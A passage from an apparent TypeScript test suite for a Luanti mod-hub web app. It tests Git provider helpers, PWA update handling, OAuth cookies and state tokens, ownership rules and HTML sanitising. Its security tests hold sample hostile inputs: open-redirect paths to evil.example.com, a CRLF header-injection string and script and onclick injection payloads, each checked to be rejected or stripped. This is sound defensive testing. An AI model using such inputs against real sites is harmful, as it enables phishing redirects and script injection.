      detectGitProviderFromUrl,
      buildProviderRawBaseCandidates,
      buildProviderRootListingApiUrl,
      buildProviderRawFileUrl
    } = await import('./core/config/git-providers.config');

    // 1. Bitbucket is recognized as a Git provider for repo scanning, but NEVER exposed as an OAuth login option
    expect(ALL_GIT_PROVIDER_IDS).toContain('bitbucket');
    expect(isGitProviderId('bitbucket')).toBe(true);
    expect(isGitProviderId('codeberg')).toBe(true);
    expect(isGitProviderId('contentdb')).toBe(false);
    expect(isAuthLoginGitProvider('bitbucket')).toBe(false);
    expect(isAuthLoginGitProvider('custom')).toBe(false);
    expect(AUTH_LOGIN_GIT_PROVIDER_IDS).toEqual(['codeberg', 'mesehub', 'gitlab', 'github']);
    expect(AUTH_LOGIN_GIT_PROVIDER_IDS).not.toContain('bitbucket');

    // 2. Provider URL detection and raw base / root listing helpers
    expect(detectGitProviderFromUrl('https://bitbucket.org/minetest_gamers/everness/src/master/')?.provider).toBe('bitbucket');
    expect(detectGitProviderFromUrl('https://codeberg.org/Wuzzy/Lazarr')?.provider).toBe('codeberg');
    const bbCandidates = buildProviderRawBaseCandidates(
      'https://bitbucket.org/minetest_gamers/everness/src/master/',
      'SaKeL',
      'everness',
      'master'
    );
    expect(bbCandidates.map(c => c.base)).toContain('https://bitbucket.org/minetest_gamers/everness/raw/master');
    expect(
      buildProviderRootListingApiUrl(
        'bitbucket',
        'bitbucket.org',
        'minetest_gamers',
        'everness',
        'master'
      )
    ).toBe('https://api.bitbucket.org/2.0/repositories/minetest_gamers/everness/src/master/?pagelen=100');
    expect(
      buildProviderRawFileUrl('bitbucket', 'bitbucket.org', 'minetest_gamers', 'everness', 'master', 'screenshot.png')
    ).toBe('https://api.bitbucket.org/2.0/repositories/minetest_gamers/everness/src/master/screenshot.png');

    // 3. PackageService.needsTileHydration flags dual-source Git packages whose banner is still a ContentDB URL
    const pkgService = TestBed.inject(PackageService);
    const gitShot = 'https://bitbucket.org/minetest_gamers/everness/raw/master/screenshot.png';
    const cdbThumb = 'https://content.luanti.org/thumbnails/1/everness.png';
    const cdbShot1 = 'https://content.luanti.org/uploads/everness_shot_1.png';

    const evernessTile = (pkgService as any).normalizePackage({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      source: 'git',
      sources: ['official', 'git'],
      provider: 'bitbucket',
      repo: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
      license: 'LGPL-2.1-only',
      media_license: 'CC-BY-SA-4.0',
      thumbnail: cdbThumb,
      banner: cdbThumb,
      screenshots: [cdbShot1]
    });

    expect((pkgService as any).needsTileHydration(evernessTile)).toBe(true);

    // 4. Verify /api/packages/hydrate scans D1/upstream packages that have a repo_url but still lack a Git banner_url
    const { onRequestPost: onHydratePost } = await import('../../functions/api/packages/hydrate');
    const origFetch = globalThis.fetch;
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
      if (url.endsWith('/mod.conf') && url.includes('everness')) {
        return new Response('name = everness\ntitle = Everness\nlicense = LGPL-2.1-only\n', { status: 200 });
      }
      if (url.endsWith('/screenshot.png') && url.includes('everness')) {
        return new Response('', { status: 200, headers: { 'Content-Type': 'image/png' } });
      }
      return new Response('Not found', { status: 404 });
    });

    try {
      const mockDb = {
        prepare: (sql: string) => ({
          bind: (..._args: any[]) => ({
            all: async () => {
              if (sql.includes('FROM packages')) {
                return {
                  results: [
                    {
                      id: 'SaKeL/everness',
                      author_name: 'SaKeL',
                      name: 'everness',
                      type: 'mod',
                      provider: 'bitbucket',
                      repo_url: 'https://bitbucket.org/minetest_gamers/everness/src/master/',
                      license: 'LGPL-2.1-only',
                      media_license: 'CC-BY-SA-4.0',
                      thumbnail_url: cdbThumb,
                      banner_url: null,
                      screenshots: JSON.stringify([cdbShot1]),
                      tags: JSON.stringify(['mod', 'git', 'contentdb', 'environment']),
                      git_repo_status: 'verified',
                      updated_at: '2026-11-01T00:00:00Z'
                    }
                  ]
                };
              }
              return { results: [] };
            },
            run: async () => ({ success: true })
          })
        })
      };

      const hydrateRes = await onHydratePost({
        request: new Request('https://luantihub.org/api/packages/hydrate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ids: ['SaKeL/everness'] })
        }),
        env: { DB: mockDb }
      });
      expect(hydrateRes.status).toBe(200);
      const hydrateJson = await hydrateRes.json();
      expect(hydrateJson.hydrated['sakel/everness']).toBeDefined();
      expect(hydrateJson.hydrated['sakel/everness'].banner).toContain('everness');
      expect(hydrateJson.hydrated['sakel/everness'].banner).toContain('/screenshot.png');
      expect(hydrateJson.hydrated['sakel/everness'].thumbnail).toBe(cdbThumb);
      expect(hydrateJson.hydrated['sakel/everness'].screenshots).toEqual([
        hydrateJson.hydrated['sakel/everness'].banner,
        cdbShot1
      ]);

      // Verify that a dual-source ('official' + 'git') package with repo_url & video_url already set (e.g. SaKeL/everness from D1)
      // still triggers needsTileHydration until its Git screenshot.png has been checked, whereas a pure ContentDB package does not
      const pkgService = TestBed.inject(PackageService);
      (pkgService as any).hydratedIds.delete('sakel/everness');
      (pkgService as any).hydratedMetaCache.delete('sakel/everness');
      const normalizedPreHydrated = (pkgService as any).normalizePackage({
        id: 'SaKeL/everness',
        author: 'SaKeL',
        name: 'everness',
        title: 'Everness',
        type: 'mod',
        provider: 'bitbucket',
        source: 'git',
        sources: ['official', 'git'],
        license: 'LGPL-3.0-only',
        downloads: 45000,
        contentdb_downloads: 45000,
        tags: ['mapgen', 'biomes', 'environment'],
        repo_url: 'https://bitbucket.org/SaKeL/everness/src/master/',
        video_url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
        thumbnail: cdbThumb,
        banner: cdbShot1
      });
      expect((pkgService as any).hydratedIds.has('sakel/everness')).toBe(false);
      expect((pkgService as any).needsTileHydration(normalizedPreHydrated)).toBe(true);

      const pureCdbNormalized = (pkgService as any).normalizePackage({
        id: 'Wuzzy/mineclone2',
        author: 'Wuzzy',
        name: 'mineclone2',
        title: 'VoxeLibre',
        type: 'game',
        provider: 'contentdb',
        source: 'official',
        sources: ['official'],
        license: 'GPL-3.0-only',
        downloads: 500000,
        contentdb_downloads: 500000,
        tags: ['survival', 'sandbox'],
        repo_url: 'https://git.minetest.land/MineClone2/MineClone2',
        thumbnail: cdbThumb,
        banner: cdbShot1
      });
      expect((pkgService as any).hydratedIds.has('wuzzy/mineclone2')).toBe(true);
      expect((pkgService as any).needsTileHydration(pureCdbNormalized)).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should support Window Controls Overlay (WCO) state, geometrychange, and Back/Forward history navigation', () => {
    const pwaService = TestBed.inject(PwaService);
    const origWco = (navigator as any).windowControlsOverlay;

    const listeners: Array<() => void> = [];
    const mockWco = {
      visible: true,
      getTitlebarAreaRect: () => ({ x: 78, y: 0, width: 1180, height: 38 }),
      addEventListener: (type: string, cb: () => void) => {
        if (type === 'geometrychange') {
          listeners.push(cb);
        }
      }
    };

    try {
      Object.defineProperty(navigator, 'windowControlsOverlay', {
        configurable: true,
        value: mockWco
      });

      pwaService.initWindowControlsOverlay();
      expect(pwaService.isWcoActive()).toBe(true);
      expect(pwaService.wcoTitlebarRect()).toEqual({ x: 78, y: 0, width: 1180, height: 38 });
      expect(document.documentElement.classList.contains('wco-active')).toBe(true);

      // Simulate geometrychange when user toggles WCO off in titlebar
      mockWco.visible = false;
      listeners.forEach(fn => fn());
      expect(pwaService.isWcoActive()).toBe(false);
      expect(pwaService.wcoTitlebarRect()).toBeNull();
      expect(document.documentElement.classList.contains('wco-active')).toBe(false);

      // Verify history Back / Forward state tracking and Header buttons
      mockWco.visible = true;
      listeners.forEach(fn => fn());
      expect(pwaService.isWcoActive()).toBe(true);

      const backSpy = vi.spyOn(window.history, 'back').mockImplementation(() => {});
      const forwardSpy = vi.spyOn(window.history, 'forward').mockImplementation(() => {});

      window.history.pushState({ page: 1 }, '', '/mods');
      expect(pwaService.canNavigateBack()).toBe(true);

      pwaService.navigateBack();
      expect(backSpy).toHaveBeenCalled();
      expect(pwaService.canNavigateForward()).toBe(true);

      pwaService.navigateForward();
      expect(forwardSpy).toHaveBeenCalled();

      backSpy.mockRestore();
      forwardSpy.mockRestore();
    } finally {
      if (origWco !== undefined) {
        Object.defineProperty(navigator, 'windowControlsOverlay', {
          configurable: true,
          value: origWco
        });
      } else {
        delete (navigator as any).windowControlsOverlay;
      }
      document.documentElement.classList.remove('wco-active');
    }
  });

  it('should hand off to Service Worker on visibilitychange (hidden) and handle LH_APP_UPDATE_DETECTED while minimized', async () => {
    const pwaService = TestBed.inject(PwaService);
    const triggerSpy = vi.spyOn(pwaService, 'triggerSwBackgroundCatalogCheck').mockImplementation(() => {});
    const syncIdbSpy = vi.spyOn(pwaService, 'syncNotificationStateToIndexedDb').mockResolvedValue();
    const origVisDescriptor = Object.getOwnPropertyDescriptor(document, 'visibilityState');

    try {
      Object.defineProperty(document, 'visibilityState', {
        configurable: true,
        get: () => 'hidden'
      });
      document.dispatchEvent(new Event('visibilitychange'));
      await new Promise(resolve => setTimeout(resolve, 15));

      expect(syncIdbSpy).toHaveBeenCalled();
      expect(triggerSpy).toHaveBeenCalled();

      // Simulate Service Worker broadcasting LH_APP_UPDATE_DETECTED while minimized
      const reloadSpy = vi.spyOn(pwaService, 'reloadWindow').mockImplementation(() => {});
      (pwaService as any).syncBroadcastChannel?.onmessage?.({
        data: {
          type: 'LH_APP_UPDATE_DETECTED',
          signature: 'main-NEW123.js|styles-NEW456.css|hash789',
          tag: 'lh-app-update-main-NEW123.js|styles-NEW456.css|hash789',
          notified: true,
          ts: Date.now()
        }
      } as MessageEvent);
      await new Promise(resolve => setTimeout(resolve, 15));

      expect(pwaService.updateAvailable()).toBe(true);
      expect(pwaService.hasSeenNotificationTag('lh-app-update-main-NEW123.js|styles-NEW456.css|hash789')).toBe(true);
      expect(reloadSpy).toHaveBeenCalledTimes(1);
      expect(sessionStorage.getItem('lh_pwa_auto_updated_version')).toBe(
        'main-NEW123.js|styles-NEW456.css|hash789'
      );

      // Verify post-reload boot toast ("lh_pwa_just_auto_updated") fires pwa.autoUpdatedSuccess and clears receipt
      const toastShown = pwaService.checkAndShowPostUpdateToast();
      expect(toastShown).toBe(true);
      expect(pwaService.statusMessage()).toBe('pwa.autoUpdatedSuccess');
      expect(localStorage.getItem('lh_pwa_just_auto_updated')).toBeNull();
      expect(sessionStorage.getItem('lh_pwa_just_auto_updated')).toBeNull();

      // Verify no manual "Reload Now" CTA banner is rendered in the DOM
      const fixture = TestBed.createComponent(App);
      fixture.detectChanges();
      const rootEl = fixture.nativeElement as HTMLElement;
      expect(rootEl.textContent).toContain('LuantiHub has been updated to the latest version.');
      expect(rootEl.textContent).not.toContain('Reload Now');

      reloadSpy.mockRestore();
    } finally {
      triggerSpy.mockRestore();
      syncIdbSpy.mockRestore();
      if (origVisDescriptor) {
        Object.defineProperty(document, 'visibilityState', origVisDescriptor);
      } else {
        delete (document as any).visibilityState;
      }
    }
  });

  it('should share lh_session cookies across .luantihub.org and preserve initiating PWA origin & validated returnTo path across OAuth redirects', async () => {
    const {
      createOAuthStateToken,
      parseOAuthStateToken,
      sanitizeRelativeReturnPath,
      buildSessionCookie,
      buildClearSessionCookies
    } = await import('../../functions/api/auth/lib/session');

    // 1. Verify Domain=.luantihub.org cookie sharing between www.luantihub.org and luantihub.org
    const apexCookie = buildSessionCookie('tok123', 'https://luantihub.org/api/auth/github/callback');
    const wwwCookie = buildSessionCookie('tok123', 'https://www.luantihub.org/api/auth/me');
    const localCookie = buildSessionCookie('tok123', 'http://localhost:4200/api/auth/me');
    expect(apexCookie).toContain('Domain=.luantihub.org');
    expect(wwwCookie).toContain('Domain=.luantihub.org');
    expect(localCookie).not.toContain('Domain=');

    const clearCookies = buildClearSessionCookies('https://luantihub.org/api/auth/logout');
    expect(clearCookies.length).toBe(2);
    expect(clearCookies.some(c => c.includes('Domain=.luantihub.org'))).toBe(true);

    // 2. Verify HMAC OAuth state preserves trusted initiating origin and validated relative returnTo path
    const stateWww = await createOAuthStateToken('github', 'test-secret', {
      origin: 'https://www.luantihub.org',
      returnTo: '/package/SaKeL/everness'
    });
    const parsedWww = await parseOAuthStateToken(stateWww, 'github', 'test-secret');
    expect(parsedWww.valid).toBe(true);
    expect(parsedWww.origin).toBe('https://www.luantihub.org');
    expect(parsedWww.returnTo).toBe('/package/SaKeL/everness');

    // Reject untrusted origin and open-redirect returnTo payloads in state token
    expect(sanitizeRelativeReturnPath('//evil.example.com/phish')).toBeUndefined();
    expect(sanitizeRelativeReturnPath('/\\evil.example.com/phish')).toBeUndefined();
    expect(sanitizeRelativeReturnPath('https://evil.example.com/phish')).toBeUndefined();
    expect(sanitizeRelativeReturnPath('/valid\r\nHeader: injected')).toBeUndefined();
    expect(sanitizeRelativeReturnPath('/profile?tab=account&auth_success=1')).toBe('/profile?tab=account');

    const stateEvil = await createOAuthStateToken('github', 'test-secret', {
      origin: 'https://evil.example.com',
      returnTo: '//evil.example.com/steal'
    });
    const parsedEvil = await parseOAuthStateToken(stateEvil, 'github', 'test-secret');
    expect(parsedEvil.valid).toBe(true);
    expect(parsedEvil.origin).toBeUndefined();
    expect(parsedEvil.returnTo).toBeUndefined();
  });

  it('should enforce strict package ownership via claimed author_id or verified forge ownership (without heuristic suffix stripping) and block self-reviews', async () => {
    const {
      verifyStrictPackageAuthorOwnership
    } = await import('../../functions/api/auth/lib/session');
    const authService = TestBed.inject(AuthService);
    const packageService = TestBed.inject(PackageService);

    const sessionUser: any = {
      id: '42',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'https://avatars.githubusercontent.com/u/1?v=4',
      bio: null,
      website_url: null,
      provider: 'github' as const,
      role: 'admin' as const,
      identities: [
        { provider: 'github' as const, provider_username: 'sakel-hub', profile_url: 'https://github.com/sakel-hub', verified: true }
      ],
      verifiedHandles: ['sakel-hub']
    };

    // Unclaimed package with different author handle ('SaKeL' vs 'sakel-hub') and Bitbucket repo must NOT match via heuristic suffix stripping
    expect(
      verifyStrictPackageAuthorOwnership(
        sessionUser,
        sessionUser.identities,
        {
          author_id: 'ext_sakel',
          author_name: 'SaKeL',
          repo_url: 'https://bitbucket.org/minetest_gamers/everness'
        },
        'SaKeL'
      )
    ).toBe(false);

    // Once claimed (author_id === sessionUser.id), strict ownership succeeds on both server and client
    expect(
      verifyStrictPackageAuthorOwnership(
        sessionUser,
        sessionUser.identities,
        {
          author_id: '42',
          author_name: 'SaKeL',
          repo_url: 'https://bitbucket.org/minetest_gamers/everness'
        },
        'SaKeL'
      )
    ).toBe(true);

    (authService as any)._currentUser.set(sessionUser);
    const unclaimedPkg: any = {
      id: 'SaKeL/everness',
      name: 'everness',
      title: 'Everness',
      author: 'SaKeL',
      type: 'mod',
      short_description: 'Everness mod',
      repo: 'https://bitbucket.org/minetest_gamers/everness'
    };
    expect(authService.isPackageAuthor(unclaimedPkg)).toBe(false);

    const claimedEvernessPkg: any = {
      ...unclaimedPkg,
      author_id: '42'
    };
    expect(authService.isPackageAuthor(claimedEvernessPkg)).toBe(true);
    expect(authService.canManagePackage(claimedEvernessPkg)).toBe(true);

    const submitResult = await packageService.submitReview(claimedEvernessPkg, {
      rating: 5,
      title: 'Self review attempt',
      comment: 'Trying to review my own claimed package should be blocked.'
    });
    expect(submitResult.success).toBe(false);
    expect(submitResult.message).toContain('cannot rate or review their own packages');
  });

  it('should block unauthenticated tokenless sign-in on POST /api/auth/me and require auth on package moderation report', async () => {
    const { onRequestPost: onAuthMePost } = await import('../../functions/api/auth/me');
    const { onRequestPost: onModeratePost } = await import('../../functions/api/packages/[author]/[name]/moderate');

    const unauthSignInReq = new Request('https://luantihub.org/api/auth/me', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ provider: 'github', username: 'SaKeL' })
    });
    const signInRes = await onAuthMePost({
      request: unauthSignInReq,
      env: { DB: undefined }
    } as any);
    expect(signInRes.status).toBe(401);

    const unauthReportReq = new Request('https://luantihub.org/api/packages/SaKeL/everness/moderate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'report', reason: 'spam' })
    });
    const reportRes = await onModeratePost({
      request: unauthReportReq,
      env: { DB: { prepare: () => ({ bind: () => ({ first: async () => null, run: async () => ({}) }) }) } as any },
      params: { author: 'SaKeL', name: 'everness' }
    } as any);
    expect(reportRes.status).toBe(401);
  });

  it('should support tap-to-toggle tooltips on touch devices for info icons, reset hero auto-slide timer on manual switch, open in-app Luanti Blog Article Dialog, and adapt WCO titlebar layout responsively', async () => {
    const { sanitizeAndFormatBlogHtml, enrichLuantiBlogPostFromArticleHtml } = await import('./core/models/package.model');
    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);

    // 1. Verify Luanti Blog feed HTML formatting, removal of "All Blog Posts" secondary CTA, and in-app Blog Article Dialog
    const sampleFeedJson = JSON.stringify({
      version: 'https://jsonfeed.org/version/1.1',
      title: 'Luanti Blog',
      items: [
        {
          id: 'https://blog.luanti.org/2026/08/21/5.17.0-released/',
          url: 'https://blog.luanti.org/2026/08/21/5.17.0-released/',
          title: 'Luanti 5.17.0 – Released!',
          content_html:
            '<figure><img src="/static/blog/5.17.0/cover.webp" /><figcaption>Cover</figcaption></figure>' +
            '<h2>Highlights</h2><p>Read the <a href="/2026/08/21/changelog/">full changelog</a> and see <img src="/static/blog/5.17.0/gamepad.webp" />.</p>' +
            '<script>alert(1)</script>',
          image: 'https://blog.luanti.org/static/blog/5.17.0/cover.webp',
          date_published: '2026-08-21T12:00:00Z'
        }
      ]
    });

    const parsedBlog = parseLuantiBlogFeed(sampleFeedJson);
    expect(parsedBlog).toBeTruthy();
    expect(parsedBlog?.content_html).toBeTruthy();
    expect(parsedBlog?.content_html).toContain('<h2>Highlights</h2>');
    expect(parsedBlog?.content_html).toContain('href="https://blog.luanti.org/2026/08/21/changelog/"');
    expect(parsedBlog?.content_html).toContain('target="_blank" rel="noopener noreferrer"');
    expect(parsedBlog?.content_html).toContain('src="https://blog.luanti.org/static/blog/5.17.0/gamepad.webp"');
    expect(parsedBlog?.content_html).not.toContain('<script>');
    // Leading duplicate cover figure is stripped so it isn't shown twice under the modal cover banner
    expect(parsedBlog?.content_html).not.toContain('cover.webp');
    expect(sanitizeAndFormatBlogHtml('<p onclick="evil()">Safe</p>')).toBe('<p>Safe</p>');

    // Verify enrichLuantiBlogPostFromArticleHtml preserves Jekyll _layouts/post.html credits ("Cover image by Zenon Seth.") and author
    const renderedArticleHtml = `
      <header class="hero hero-shadow is-medium is-primary">
        <div class="hero-image" style="background-image: url('/static/blog/2026_cdb_incident/cover.webp');"></div>
        <div class="hero-body">
          <div class="container">
            <h1 class="title">URGENT: ContentDB security incident: 22–26 October 2026</h1>
            <p class="subtitle">Written by Luanti team</p>
          </div>
        </div>
      </header>
      <main class="container my-6">
        <article class="content">
          <script type="application/ld+json">{"@type":"BlogPosting","image":"https://blog.luanti.org/static/blog/2026_cdb_incident/cover.webp"}</script>
          <p>If you have any questions or concerns, or notice anything suspicious, please contact us at <a href="mailto:security@luanti.org">security@luanti.org</a>.</p>
          <p class="mt-6 has-text-grey">Cover image by Zenon Seth.</p>
        </article>
      </main>
    `;
    const enrichedBlog = enrichLuantiBlogPostFromArticleHtml(parsedBlog!, renderedArticleHtml);
    expect(enrichedBlog.author).toBe('Luanti team');
    expect(enrichedBlog.content_html).toContain('Cover image by Zenon Seth.');
    expect(enrichedBlog.content_html).not.toContain('application/ld+json');

    pkgService.setLatestBlogPost(parsedBlog!);
    const blogSlide = pkgService.heroShowcasePackages()[0];
    expect(blogSlide._promo?.cta_label).toBe('Read Article');
    expect(blogSlide._promo?.secondary_cta_label).toBeUndefined();
    expect(blogSlide._promo?.secondary_cta_url).toBeUndefined();

    // Clicking "Read Article" on the Hero Billboard opens the in-app Blog Article Dialog instead of navigating externally
    // and pushes `/blog` onto history so browser Back / touch swipe-back closes the dialog without exiting the app
    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    heroFixture.detectChanges();
    const heroComp = heroFixture.componentInstance;
    heroComp.currentIndex.set(0);
    const navSpy = vi.spyOn(pkgService as any, 'navigatePreservingScroll');
    heroComp.onPromoCtaClick(blogSlide._promo!.cta_url, new MouseEvent('click'));
    expect(pkgService.activeBlogArticle()?.title).toBe('Luanti 5.17.0 – Released!');
    expect(pkgService.activeBlogArticle()?.image_url).toBe('https://blog.luanti.org/static/blog/5.17.0/cover.webp');
    expect(navSpy).toHaveBeenCalledWith(['/blog']);

    // Updating blog post with a payload that lacks a cover image must preserve the real hero cover image
    pkgService.setLatestBlogPost({
      ...parsedBlog!,
      image_url: '/screenshot-desktop.png'
    });
    expect(pkgService.activeBlogArticle()?.image_url).toBe('https://blog.luanti.org/static/blog/5.17.0/cover.webp');

    // Simulating browser Back / touch swipe-left from `/blog` to `/` closes the Blog Article Dialog
    (pkgService as any).syncStateFromUrl('/');
    expect(pkgService.activeBlogArticle()).toBeNull();

    // Direct `/blog` URL sync re-opens the Blog Article Dialog and `closeBlogArticleModal()` navigates back to `/`
    (pkgService as any).syncStateFromUrl('/blog');
    expect(pkgService.activeBlogArticle()?.title).toBe('Luanti 5.17.0 – Released!');
    pkgService.closeBlogArticleModal();
    expect(pkgService.activeBlogArticle()).toBeNull();
    expect(navSpy).toHaveBeenLastCalledWith(['/']);
    navSpy.mockRestore();

    // 2. Verify Hero Billboard auto-slide timer resets from 0 when manually switching slides even while hovered (isPaused() === true)
    const twoSlides = [
      blogSlide,
      (pkgService as any).normalizePackage({
        id: 'Wuzzy/mineclone2',
        author: 'Wuzzy',
        name: 'mineclone2',
        title: 'VoxeLibre',
        type: 'game',
        short_desc: 'Survival sandbox game',
        downloads: 500000
      })
    ];
    (pkgService as any)._packages.set([twoSlides[1]]);
    heroFixture.detectChanges();

    heroComp.onMouseEnter();
    expect(heroComp.isPaused()).toBe(true);
    const startSpy = vi.spyOn(heroComp as any, 'startAutoSlide');
    heroComp.next(new MouseEvent('click'));
    expect(startSpy).toHaveBeenCalledTimes(1);
    heroComp.goTo(0, new MouseEvent('click'));
    expect(startSpy).toHaveBeenCalledTimes(2);
    startSpy.mockRestore();

    // 3. Verify Responsive WCO titlebar geometry variables and isWcoCompact threshold (< 1180px)
    const origWco = (navigator as any).windowControlsOverlay;
    const wcoListeners: Array<() => void> = [];
    let currentRect = { x: 80, y: 0, width: 920, height: 38 };
    try {
      Object.defineProperty(navigator, 'windowControlsOverlay', {
        configurable: true,
        value: {
          visible: true,
          getTitlebarAreaRect: () => currentRect,
          addEventListener: (type: string, cb: () => void) => {
            if (type === 'geometrychange') wcoListeners.push(cb);
          }
        }
      });

      pwaService.initWindowControlsOverlay();
      expect(pwaService.isWcoActive()).toBe(true);
      expect(pwaService.isWcoCompact()).toBe(true);
      expect(document.documentElement.style.getPropertyValue('--wco-titlebar-width')).toBe('920px');
      expect(document.documentElement.style.getPropertyValue('--wco-titlebar-x')).toBe('80px');

      currentRect = { x: 80, y: 0, width: 1360, height: 38 };
      wcoListeners.forEach(fn => fn());
      expect(pwaService.isWcoCompact()).toBe(false);
      expect(document.documentElement.style.getPropertyValue('--wco-titlebar-width')).toBe('1360px');
    } finally {
      if (origWco !== undefined) {
        Object.defineProperty(navigator, 'windowControlsOverlay', {
          configurable: true,
          value: origWco
        });
      } else {
        delete (navigator as any).windowControlsOverlay;
      }
      document.documentElement.classList.remove('wco-active');
      document.documentElement.style.removeProperty('--wco-titlebar-x');
      document.documentElement.style.removeProperty('--wco-titlebar-width');
      document.documentElement.style.removeProperty('--wco-titlebar-height');
      document.documentElement.style.removeProperty('--wco-right-inset');
    }
  });

  it('should preserve active non-expired Hero promotional slides across background catalog refreshes and verify self-contained session token claims', async () => {
    const pkgService = TestBed.inject(PackageService);
    const futureIso = new Date(Date.now() + 3600_000).toISOString();

    pkgService.setPromotions([
      {
        id: 'promo_keep_active',
        title: 'Luanti Game Jam 2026!',
        short_desc: 'Official Game Jam promotion',
        banner_url: '/banners/gamejam_2026.png',
        cta_label: 'Download',
        cta_url: 'https://www.luanti.org',
        badge_text: 'PROMOTED',
        starts_at: new Date(Date.now() - 60_000).toISOString(),
        expires_at: futureIso,
        priority: 100
      }
    ]);
    expect(pkgService.activePromotions()[0]?.id).toBe('promo_keep_active');

    // Simulate a background catalog refresh where D1 quota error caused promotions to be omitted or empty
    (pkgService as any).applyBootPayload({
      packages: [
        {
          author: 'Wuzzy',
          name: 'mineclone2',
          title: 'VoxeLibre',
          type: 'game',
          short_desc: 'Survival sandbox game',
          downloads: 500000
        }
      ],
      promotions: []
    });

    expect(pkgService.activePromotions()[0]?.id).toBe('promo_keep_active');
    expect(pkgService.heroShowcasePackages().some(p => p.id === 'promo:promo_keep_active')).toBe(true);

    // Disabling show_in_hero and row_enabled immediately prunes it from activeHeroPromotions, heroShowcasePackages, and localStorage
    pkgService.setPromotions([
      {
        id: 'promo_keep_active',
        title: 'Luanti Game Jam 2026!',
        short_desc: 'Official Game Jam promotion',
        banner_url: '/banners/gamejam_2026.png',
        cta_label: 'Download',
        cta_url: 'https://www.luanti.org',
        badge_text: 'PROMOTED',
        starts_at: new Date(Date.now() - 60_000).toISOString(),
        expires_at: futureIso,
        priority: 100,
        show_in_hero: false,
        row_enabled: false
      }
    ]);
    expect(pkgService.activeHeroPromotions().length).toBe(0);
    expect(pkgService.heroShowcasePackages().some(p => p.id === 'promo:promo_keep_active')).toBe(false);
    expect(localStorage.getItem('lh_active_promotions_v1')).toBeNull();

    // Verify self-contained session token claims round-trip
    const token = await createSessionToken('usr_sakel', 'test-secret', {
      username: 'sakel',
      displayName: 'SaKeL',
      avatarUrl: 'https://github.com/sakel.png',
      provider: 'github',
      role: 'admin',
      verified: true
    });
    expect(await verifySessionToken(token, 'test-secret')).toBe('usr_sakel');
    const claims = await verifySessionTokenClaims(token, 'test-secret');
    expect(claims?.userId).toBe('usr_sakel');
    expect(claims?.username).toBe('sakel');
    expect(claims?.displayName).toBe('SaKeL');
    expect(claims?.provider).toBe('github');
    expect(claims?.role).toBe('admin');
    expect(claims?.verified).toBe(true);

    // Verify ensureExtendedPackageColumns(db) executes zero D1 queries unless forced
    let prepareCalls = 0;
    const mockDb = {
      prepare: () => {
        prepareCalls += 1;
        return {
          all: async () => ({ results: [] }),
          run: async () => ({})
        };
      }
    };
    await ensureExtendedPackageColumns(mockDb);
    expect(prepareCalls).toBe(0);

    // Verify PwaService.checkForUpdate detects backend-only deployments via <meta name="lh-build-timestamp"> & manifest.timestamp
    const pwaService = TestBed.inject(PwaService);
    const metaEl = document.createElement('meta');
    metaEl.setAttribute('name', 'lh-build-timestamp');
    metaEl.setAttribute('content', '1793620000000');
    document.head.appendChild(metaEl);

    const origFetch = globalThis.fetch;
    try {
      pwaService.updateAvailable.set(false);
      (pwaService as any).bootManifestSignature = null;
      globalThis.fetch = (async () =>
        new Response(
          JSON.stringify({
            configVersion: 1,
            timestamp: 1793629999999,
            appData: { buildTimestamp: 1793629999999 },
            assetGroups: [
              {
                name: 'app',
                urls: ['/main-IKR2CUGR.js', '/styles-J7YB6QKE.css', '/index.html']
              }
            ],
            hashTable: {
              '/index.html': 'same_hash',
              '/custom-sw.js': 'same_sw_hash'
            }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        )) as any;

      const detected = await pwaService.checkForUpdate(true);
      expect(detected).toBe(true);
      expect(pwaService.updateAvailable()).toBe(true);

      // Simulate reload into the new build where DOM <meta name="lh-build-timestamp"> now matches remote manifest,
      // even if a stale pre-reload bootManifestSignature existed prior to check
      pwaService.updateAvailable.set(false);
      metaEl.setAttribute('content', '1793629999999');
      (pwaService as any).bootManifestSignature = '/main-OLD.js|/styles-OLD.css|old_hash';

      const secondCheckAfterReload = await pwaService.checkForUpdate(true);
      expect(secondCheckAfterReload).toBe(false);
      expect(pwaService.updateAvailable()).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
      metaEl.remove();
      pwaService.updateAvailable.set(false);
    }

    pkgService.setPromotions([]);
  });

  it('should support multiple Hero promotional slides, Promotional Package Row #1 (Game Jam 2026 & Tag Showcases), multi-language localization, and ContentDB-agnostic tag sync', async () => {
    const pkgService = TestBed.inject(PackageService);
    const i18n = TestBed.inject(TranslationService);
    const futureIso = new Date(Date.now() + 7 * 24 * 3600_000).toISOString();

    // 1. Seed catalog packages including a new ContentDB Game Jam 2026 submission and an existing package
    (pkgService as any).applyBootPayload({
      packages: [
        {
          id: 'Wuzzy/mineclone2',
          author: 'Wuzzy',
          name: 'mineclone2',
          title: 'VoxeLibre',
          type: 'game',
          short_desc: 'Survival sandbox game',
          downloads: 500000,
          score: 4.9,
          tags: ['survival', 'sandbox']
        },
        {
          id: 'jammer/voxel_quest_2026',
          author: 'jammer',
          name: 'voxel_quest_2026',
          title: 'Voxel Quest 2026',
          type: 'game',
          short_desc: 'Submission for the annual Luanti Game Jam 2026',
          downloads: 120,
          score: 4.8,
          created_at: new Date().toISOString(),
          tags: ['jam_game_2026', 'gamejam', 'singleplayer']
        },
        {
          id: 'jammer2/sky_islands_2026',
          author: 'jammer2',
          name: 'sky_islands_2026',
          title: 'Sky Islands 2026',
          type: 'game',
          short_desc: 'Floating islands adventure for Game Jam 2026',
          downloads: 45,
          score: 4.7,
          created_at: new Date(Date.now() + 5000).toISOString(),
          tags: ['jam_game_2026']
        }
      ]
    });

    // 2. Configure 3 simultaneous promotions:
    // - Promo A (priority 200): Game Jam 2026 (Both Hero Slide #1 AND Promotional Package Row #1)
